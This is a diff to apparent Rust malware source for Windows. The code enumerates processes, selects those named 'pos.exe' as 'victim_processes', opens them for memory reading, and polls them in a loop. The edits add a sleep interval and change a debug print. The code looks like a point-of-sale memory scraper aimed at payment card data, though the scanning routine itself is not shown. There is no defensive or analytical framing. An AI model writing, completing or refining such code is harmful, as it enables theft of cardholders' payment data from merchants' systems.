@@ -12,6 +12,9 @@ use winapi::um::processthreadsapi::OpenProcess;
 use winapi::um::psapi::{EnumProcesses, EnumProcessModules, GetModuleFileNameExW};
 use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
 
+use std::time::Duration;
+use std::thread::sleep;
+
 #[derive(Debug)]
 pub struct Process {
     pid: u32,
@@ -154,12 +157,12 @@ fn main() {
         proc.get_name();
         println!("opened pid: {}: {}", pid, proc.name);
         
-        if proc.name.contains("pos.exe") {//if proc.name.contains("MSRX.exe") {
+        if proc.name.contains("pos.exe") {
             victim_processes.push(proc);
         }
     }
 
-    println!("{:?}", victim_processes);
+    println!("found pos process:\n{:?}", victim_processes);
     
     loop {
         for proc in &victim_processes {
@@ -168,5 +171,7 @@ fn main() {
                 Err(e) => eprintln!("{}", e)
             }
         }
+
+        sleep(Duration::from_millis(500));
     }
 }
